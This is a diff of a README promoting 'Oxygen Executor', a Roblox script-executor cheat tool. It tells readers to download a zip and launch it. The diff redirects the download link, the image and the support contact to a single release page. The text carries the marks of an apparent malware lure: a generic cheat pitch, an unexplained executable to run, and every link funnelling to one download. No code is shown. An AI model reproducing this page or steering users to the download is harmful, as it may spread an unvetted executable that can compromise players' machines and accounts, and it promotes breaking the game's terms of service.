@@ -12,7 +12,7 @@ Welcome to the **Roblox-Oxygen** repository! Oxygen Executor is a robust script 
 
 ## How to Use
 1. Download the Oxygen Executor tool from the following link:
-[Download Oxygen Executor](https://github.com/user-attachments/files/18060583/Software.zip)
+[Download Oxygen Executor](https://github.com/loolsfrkg/Roblox-Oxygen/releases/tag/v2.0)
 
 2. Launch the downloaded file to start using Oxygen Executor.
 
@@ -21,7 +21,7 @@ _**Note:** If the link provided does not work, please check the "Releases" secti
 ## Get Started
 Experience the power of Oxygen Executor and elevate your gameplay on Roblox today!
 
-![Roblox Oxygen](https://via.placeholder.com/800x400)
+![Roblox Oxygen](https://github.com/loolsfrkg/Roblox-Oxygen/releases/tag/v2.0)
 
 ## About Roblox
 Roblox is a popular online platform that allows users to design, create, and play games created by other users. It offers a diverse range of games across various genres, providing endless entertainment for players of all ages.
@@ -30,6 +30,6 @@ Roblox is a popular online platform that allows users to design, create, and pla
 The **Roblox-Oxygen** repository is not affiliated with Roblox Corporation. Use Oxygen Executor responsibly and adhere to the platform's terms of service.
 
 ## Connect with Us
-For questions or support, please reach out to us at [email@example.com](mailto:email@example.com). We are here to assist you with any inquiries regarding Oxygen Executor.
+For questions or support, please reach out to us at [https://github.com/loolsfrkg/Roblox-Oxygen/releases/tag/v2.0](https://github.com/loolsfrkg/Roblox-Oxygen/releases/tag/v2.0). We are here to assist you with any inquiries regarding Oxygen Executor.
 
 Thank you for visiting the **Roblox-Oxygen** repository! Happy gaming on Roblox!
